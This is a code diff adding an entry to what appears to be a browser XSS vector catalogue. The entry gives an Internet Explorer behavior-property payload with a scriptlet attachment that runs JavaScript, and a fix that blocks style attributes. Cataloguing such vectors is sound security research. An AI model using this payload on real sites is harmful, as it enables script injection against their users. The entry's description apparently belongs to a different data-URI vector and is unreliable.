@@ -1636,5 +1636,41 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'base64'],
         'reporter'   : '.mario'
+    },
+    { /* ID 52 - Internet Explorer Scriptlets executing JavaScript */
+        'id'         : 52,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Internet Explorer Scriptlets executing JavaScript',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<x style="behavior:url(%sct_path%)">',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '1',            
+            'path'          : '',
+            'name'          : 'test.sct',
+            'raw'           : '<SCRIPTLET><IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>'
+        },        
+        'description': {
+            'en' : 'Almost all browsers supoorting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx'],
+        'howtofix'   : {
+            'en' : 'Users should not be able to either submit CSS or HTML containing style attributes. If necessary make sure the "behavior" property is not whitelisted.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'scriptlet', 'internet explorer', 'style', 'scc', 'sct'],
+        'reporter'   : '.mario'
     }
 ]
